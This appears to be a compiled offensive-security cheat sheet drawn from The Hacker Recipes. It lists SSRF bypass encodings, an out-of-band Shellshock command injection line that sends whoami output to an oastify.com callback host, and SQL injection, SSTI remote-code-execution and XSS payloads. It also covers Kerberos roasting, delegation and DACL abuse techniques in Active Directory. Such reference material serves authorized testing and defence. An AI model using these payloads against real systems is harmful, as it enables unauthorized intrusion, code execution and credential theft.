# The Hacker Recipes — Complete Article Synthesis
# All articles extracted from live site (June 6, 2026)
# Previous downloads were VitePress JS shells only — now real content

---

## WEB INPUTS

### SSRF (Server-Side Request Forgery)
**Alternative IP representations (bypass 127.0.0.1/localhost blocks):**
- http://127.1, http://0, http:@0/, http://0.0.0.0:80
- http://[::]:80/, http://[0000::1]:80/
- http://2130706433 (decimal localhost)
- http://0x7f000001/ (hex localhost)
- URL-encode (single/double), DNS rebinding

**Blind SSRF detection tools:**
- Burp Collaborator, pingb.in, canarytokens, interactsh (ProjectDiscovery)
- webhook.site, ssrf-sheriff
- Collaborator Everywhere (Burp extension — adds non-invasive payloads to all headers)

**SSRF + Shellshock (CVE-2014-6271):** Blind SSRF combined with Shellshock for RCE.

**SSRF via SNI from Certificate:** Insecure NGINX stream config using `$ssl_preread_server_name` directly as backend. Exploit: `openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf`

**SSRF with Command Injection (OOB):**
```
url=http://zad8nb8tb7dst2yohw0br7rr6ich07ow.oastify.com?`whoami`
User-Agent: () { :; }; /bin/nslookup $(whoami).zad8nb8tb7dst2yohw0br7rr6ich07ow.oastify.com
```

**Tools:** SSRFMap (Python), Gopherus (Python — MySQL, PostgreSQL, FastCGI, Redis, Zabbix, Memcache, SMTP)

---

### SQL Injection
**Detection payloads (test ALL inputs — GET/POST, cookies, headers):**
```
'   "   #   ;   )   *   %
parameter=1, 1', 1", [1], []=1, 1`, 1\, 1/**/, 1/*!111'*/
1' or '1'='1, 1 or 1=1, ' or ''=', ' OR 1 -- -
1' or 1=1 --, 1' or 1=1 -- -, 1' or 1=1 /*, '='
```

**Universal probe (SQLi + XSS + SSTI):** `'"<svg/onload=prompt(5);>{{7*7}}`

**UNION-based extraction:**
- Find columns: `' ORDER BY 2 --` (iterate until error)
- DB version: `' UNION SELECT @@version, NULL --`
- Table names: `' UNION SELECT NULL,concat(COLUMN_NAME) from information_schema.columns where table_name='users' --`
- Data: `' UNION SELECT username,password from users --`

**Tools:** sqlmap, SQLninja

**Resources:** MySQL Injection Cheat Sheet, PentestMonkey cheatsheets, PortSwigger SQLi Cheat Sheet, Loose Compare Tables

---

### SSTI (Server-Side Template Injection)
**Detection:** `{{7*7}}` → 49 in Jinja2/Twig

**Jinja2 (Python) RCE payloads:**
- With imported os: `{{ os.popen('id').read() }}`
- Via request: `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`
- Context-independent (Podalirius):
  - `{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}`
  - `{{ self._TemplateReference__context.joiner.__init__.__globals__.os }}`
  - `{{ self._TemplateReference__context.namespace.__init__.__globals__.os }}`

**WAF bypass — hex encoding:**
```
{{ request['\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']... }}
```

**Methodology:** Start from desired RCE primitive, work backwards through object tree. Use `''`, `[]`, `{}` as starting constructors if no variable exposed.

**Vulnerable code pattern (Flask):** `render_template_string('Welcome ' + request.args.get('user'))` — NEVER concatenate user input into templates.

---

### XSS (Cross-Site Scripting)
**Basic payloads:**
```html
<script>alert('XSS');</script>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG onmouseover="alert('XSS')">
<<SCRIPT>alert("XSS");//<</SCRIPT>
```

**Universal probe:** `'"<svg/onload=prompt(5);>{{7*7}}`

**Filter bypass:** transformations.jobertabma.nl — identifies how input is transformed

**Automated tools:** XSStrike (Python), XSSer (Python), Dalfox (Go)

**Resources:** XSS Game, Excess XSS, OWASP DOM Based XSS, PayloadsAllTheThings XSS Injection

---

## ACTIVE DIRECTORY

### Kerberos
**Ticket flow:** AS-REQ → AS-REP (TGT) → TGS-REQ → TGS-REP (ST) → AP-REQ → AP-REP

**Key types and derivation:**
| Key | Derivation |
|-----|-----------|
| DES | From password (older) |
| RC4 | **Equals user's NT hash** |
| AES128 | Password + salt |
| AES256 | Password + salt |

**Salt:**
- Users: `DOMAIN.LOCALuser`
- Computers: `DOMAIN.LOCALhostcomputername.domain.local` ($ omitted)

**Key attacks:**
- **Overpass-the-hash (Pass the Key):** NT hash → TGT if RC4 accepted
- **Pass-the-Ticket:** Reuse illegitimate tickets
- **Golden Ticket:** krbtgt NT hash → forge TGTs

**Roasting attacks:**
- **ASREProasting:** Preauth disabled → request TGT → crack session key (user's NT hash)
- **ASREQroasting:** MITM → capture AS-REQ → crack encrypted timestamp
- **Kerberoasting:** Valid creds → request ST for SPN → crack service account NT hash
- **Kerberoasting without preauth:** User with preauth disabled → request ST via AS-REQ directly (no TGT needed)

**Delegations:**
- Constrained delegation (KCD), Resource-based (RBCD)
- **Bronze Bit (CVE-2020-17049):** Bypass constrained delegation via forwardable flag manipulation
- S4U2Self: Service requests ST to itself for any user
- S4U2Proxy: Service presents user's ST to request ticket for another service

**sAMAccountName trick:** "SRV01" → resolves to "SRV01$" computer account's principal name

**U2U (User-to-User):** Target by UPN, NO SPN requirement

---

### DACL Abuse
**ACE types:**
| Edge | Permission | Attack |
|------|-----------|--------|
| AddKeyCredentialLink | Write Key-Credential-Link | Shadow Credentials |
| WriteSPN | Write Service-Principal-Name | Targeted Kerberoasting / SPN jacking |
| AddSelf | Self on Member | Add self to group |
| AddAllowedToAct | Write msDS-Allowed-To-Act-On-Behalf-Of-Other-Identity | Kerberos RBCD |
| SyncLAPSPassword | DS-GetChanges + DS-GetChangesInFilteredSet | Sync LAPS passwords domain-wide |
| WriteAccountRestrictions | User-Account-Restrictions property set | Kerberos RBCD |

**Key permissions:**
| Permission | GUID | Use |
|-----------|------|-----|
| WriteDacl | ADS_RIGHT_WRITE_DAC | Edit object's DACL |
| GenericAll | ADS_RIGHT_GENERIC_ALL | Almost all rights combined |
| GenericWrite | ADS_RIGHT_GENERIC_WRITE | Write permissions |
| WriteOwner | ADS_RIGHT_WRITE_OWNER | Take ownership |
| User-Force-Change-Password | 00299570-246d-11d0-a768-00aa006e0529 | Change password without old one |
| DS-Replication-Get-Changes | 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 | DCSync (half) |
| DS-Replication-Get-Changes-All | 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 | DCSync (half) |
| Self-Membership | bf9679c0-0de6-11d0-a285-00aa003049e2 | Edit member attribute |
| Validated-SPN | f3a64788-5306-11d1-a9c5-0000f80367c1 | Edit servicePrincipalName |

**Self-abuse:** Users/computers can perform Kerberos RBCD on themselves. Computers can do Shadow Credentials on themselves.

**ACE Inheritance:** WriteDacl on OU + inheritance flags (0x01+0x02) → objects with AdminCount=0 inherit

**adminCount=1 bypass:** GenericAll/GenericWrite/Manage Group Policy Links on OU → spoof gPLink → compromise AdminCount=1 objects. Tool: OUned.py

**Disabled accounts:** GenericAll/GenericWrite → `set-aduser "user" -enabled 1`

**Tools:** BloodHound (bloodhound.py/SharpHound), PowerView (Get-DomainObjectAcl), Impacket dacledit.py

---

### Reconnaissance
**Active Directory recon vectors:** DHCP, DNS, NBT-NS, Responder, Port scanning, LDAP, BloodHound, MS-RPC, enum4linux, Password policy

**Web recon vectors:** HTTP headers, Comments/metadata, Error messages, Site crawling, Directory fuzzing, Subdomain enumeration, Subdomain/vhost fuzzing, WAF detection, CMS detection, Tech stack, Known vulns

**Physical recon:** Locks, NAC, HID injection, Keylogging, BIOS security, Encryption, Airstrike attack

**Radio recon:** RFID (Mifare Classic: default keys/Darkside/Nested), Bluetooth, Wi-Fi (WEP/WPA2/WPA3/WPS), Wireless keyboard/mouse

**Intelligence gathering:** CYBINT (Emails, Web infra, OSINT, GEOINT)

**Mobile:** Android (ADB, APK transform), iOS (Certificate pinning)

---

## PAGES THAT 404 (content not available on live site)
- /web/inputs/xxe — 404
- /web/inputs/deserialization — 404
- /ad/movement/ntlm-relay — 404

---

*Extracted June 6, 2026 from live thehacker.recipes site.*
*Previous downloads were VitePress JS shells with zero article content.*
